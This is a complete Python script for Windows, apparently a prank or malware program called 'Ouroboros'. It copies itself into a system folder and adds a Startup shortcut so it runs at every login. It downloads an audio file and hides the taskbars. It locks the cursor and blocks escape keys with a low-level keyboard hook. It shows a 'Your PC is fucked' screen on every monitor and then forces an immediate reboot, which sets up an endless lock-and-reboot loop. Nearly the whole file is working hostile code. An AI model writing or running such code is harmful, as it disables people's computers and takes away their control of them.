import tkinter as tk
from tkinter import messagebox
import os
import sys
import time
import subprocess
import threading
import shutil
import urllib.request
import ctypes
from ctypes import wintypes

try:
    from screeninfo import get_monitors
except ImportError:
    print("Please install screeninfo:  pip install screeninfo")
    sys.exit(1)

# ---------- configuration ----------
MP3_FILENAME = "notevibes-timeline (1).wav"
AUDIO_URL = "https://github.com/easytypeneocitiesorg-lgtm/asdasdasd/raw/refs/heads/main/notevibes-timeline%20(1).wav"
OB_FOLDER = r"C:\OB system utils"
DISPLAY_SECONDS = 10
# -----------------------------------

SW_HIDE = 0
SW_SHOW = 5

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

# ================= SETUP (FIRST THING) =================
def setup_persistence():
    """Create C:\\OB system utils, copy the script there, add startup shortcut."""
    script_path = os.path.abspath(__file__)
    os.makedirs(OB_FOLDER, exist_ok=True)

    # Copy of the script (skip if we ARE the copy already)
    copy_path = os.path.join(OB_FOLDER, os.path.basename(script_path))
    if os.path.abspath(copy_path) != script_path:
        shutil.copy2(script_path, copy_path)
        print(f"Script copied to {copy_path}")

    # Startup shortcut (skip if it already exists)
    startup = os.path.join(
        os.path.expanduser("~"), "AppData", "Roaming", "Microsoft",
        "Windows", "Start Menu", "Programs", "Startup"
    )
    lnk_path = os.path.join(startup, "Ouroboros.lnk")
    if not os.path.exists(lnk_path):
        ps = (
            "$ws = New-Object -ComObject WScript.Shell; "
            "$s = $ws.CreateShortcut('" + lnk_path.replace("'", "''") + "'); "
            "$s.TargetPath = '" + copy_path.replace("'", "''") + "'; "
            "$s.WorkingDirectory = '" + OB_FOLDER.replace("'", "''") + "'; "
            "$s.Save()"
        )
        subprocess.call(["powershell", "-NoProfile", "-Command", ps],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("Startup shortcut created")

def download_audio():
    """Download the audio into the folder this script lives in. Skip if present."""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    audio_path = os.path.join(script_dir, MP3_FILENAME)
    if os.path.isfile(audio_path):
        print("Audio already present, skipping download")
        return
    try:
        urllib.request.urlretrieve(AUDIO_URL, audio_path)
        print("Audio downloaded")
    except Exception as e:
        print(f"Audio download failed: {e}")

# ================= CURSOR LOCK =================
_cursor_lock_active = False

def hide_cursor():
    user32.ShowCursor(False)

def show_cursor():
    user32.ShowCursor(True)

def _cursor_lock_loop():
    global _cursor_lock_active
    while _cursor_lock_active:
        user32.SetCursorPos(0, 0)
        time.sleep(0.001)  # 1 ms – snaps back almost instantly

def start_cursor_lock():
    global _cursor_lock_active
    _cursor_lock_active = True
    hide_cursor()
    threading.Thread(target=_cursor_lock_loop, daemon=True).start()

def stop_cursor_lock():
    global _cursor_lock_active
    _cursor_lock_active = False
    show_cursor()

# ============ KEYBOARD HOOK (locks the normal desktop) ============
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104
WM_QUIT = 0x0012

VK_ESCAPE = 0x1B
VK_TAB = 0x09
VK_F4 = 0x73
VK_LWIN = 0x5B
VK_RWIN = 0x5C
VK_MENU = 0x12  # Alt

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.c_size_t),
    ]

_hook_handle = None
_hook_thread_id = None

def _hook_proc(nCode, wParam, lParam):
    if nCode >= 0 and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
        kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        vk = kb.vkCode
        alt_down = (user32.GetAsyncKeyState(VK_MENU) & 0x8000) != 0
        if vk in (VK_ESCAPE, VK_LWIN, VK_RWIN):
            return 1
        if vk in (VK_TAB, VK_F4) and alt_down:
            return 1
    return user32.CallNextHookEx(None, nCode, wParam, lParam)

_HOOKPROC = ctypes.CFUNCTYPE(ctypes.c_void_p, ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
_hook_callback = _HOOKPROC(_hook_proc)  # keep a reference so it isn't GC'd

def start_keyboard_hook():
    def _run():
        global _hook_handle, _hook_thread_id
        _hook_thread_id = kernel32.GetCurrentThreadId()
        _hook_handle = user32.SetWindowsHookExW(
            WH_KEYBOARD_LL, _hook_callback, kernel32.GetModuleHandleW(None), 0
        )
        msg = wintypes.MSG()
        while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
            user32.TranslateMessage(ctypes.byref(msg))
            user32.DispatchMessageW(ctypes.byref(msg))
        if _hook_handle:
            user32.UnhookWindowsHookEx(_hook_handle)
            _hook_handle = None
    threading.Thread(target=_run, daemon=True).start()
    time.sleep(0.1)  # let the hook install

def stop_keyboard_hook():
    global _hook_handle
    if _hook_thread_id and _hook_handle:
        user32.PostThreadMessageW(_hook_thread_id, WM_QUIT, 0, 0)
        time.sleep(0.1)
        if _hook_handle:
            user32.UnhookWindowsHookEx(_hook_handle)
            _hook_handle = None

# ================= TASKBAR =================
def hide_taskbars():
    hwnd = user32.FindWindowW("Shell_TrayWnd", None)
    if hwnd:
        user32.ShowWindow(hwnd, SW_HIDE)
    hwnd = user32.FindWindowW("Shell_SecondaryTrayWnd", None)
    while hwnd:
        user32.ShowWindow(hwnd, SW_HIDE)
        hwnd = user32.FindWindowExW(None, hwnd, "Shell_SecondaryTrayWnd", None)

def show_taskbars():
    hwnd = user32.FindWindowW("Shell_TrayWnd", None)
    if hwnd:
        user32.ShowWindow(hwnd, SW_SHOW)
    hwnd = user32.FindWindowW("Shell_SecondaryTrayWnd", None)
    while hwnd:
        user32.ShowWindow(hwnd, SW_SHOW)
        hwnd = user32.FindWindowExW(None, hwnd, "Shell_SecondaryTrayWnd", None)

# ================= REBOOT =================
def reboot_now():
    try:
        subprocess.call(["shutdown", "/r", "/t", "0"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"Reboot failed: {e}")

# ================= AUDIO =================
def play_audio(mp3_path, duration):
    try:
        import pygame
        pygame.mixer.init()
        pygame.mixer.music.load(mp3_path)
        pygame.mixer.music.play()
        time.sleep(duration)
        pygame.mixer.music.stop()
        pygame.mixer.quit()
    except Exception as e:
        print(f"Audio playback failed: {e}")

# ================= SCREENS =================
def create_screen_on_monitor(monitor, windows_list):
    root = tk.Toplevel() if windows_list else tk.Tk()
    root.geometry(f"{monitor.width}x{monitor.height}+{monitor.x}+{monitor.y}")
    root.configure(bg="black")
    root.overrideredirect(True)
    root.attributes("-topmost", True)

    title = tk.Label(root, text="Ouroboros", font=("Arial", 72, "bold"), fg="white", bg="black")
    title.place(relx=0.5, rely=0.45, anchor="center")

    disclaimer = tk.Label(
        root, text="Your PC is fucked.", font=("Arial", 18), fg="white", bg="black", justify="center"
    )
    disclaimer.place(relx=0.5, rely=0.58, anchor="center")

    windows_list.append(root)
    return root

def show_ouroboros_on_all_screens():
    monitors = get_monitors()
    if not monitors:
        print("No monitors detected.")
        return

    hide_taskbars()
    start_cursor_lock()
    start_keyboard_hook()

    windows = []
    for mon in monitors:
        create_screen_on_monitor(mon, windows)

    script_dir = os.path.dirname(os.path.abspath(__file__))
    mp3_path = os.path.join(script_dir, MP3_FILENAME)
    if os.path.isfile(mp3_path):
        threading.Thread(target=play_audio, args=(mp3_path, DISPLAY_SECONDS), daemon=True).start()
    else:
        print(f"MP3 not found: {mp3_path}")

    def finish():
        stop_keyboard_hook()
        stop_cursor_lock()
        show_taskbars()
        for w in windows:
            try:
                w.destroy()
            except tk.TclError:
                pass
        reboot_now()  # instant reboot – no "you are about to be signed out" popup

    if windows:
        windows[0].after(DISPLAY_SECONDS * 1000, finish)
        windows[0].mainloop()

# ================= MAIN =================
def main():
    # ---- FIRST THING: persistence setup + audio download ----
    setup_persistence()
    download_audio()

    show_ouroboros_on_all_screens()

if __name__ == "__main__":
    main()
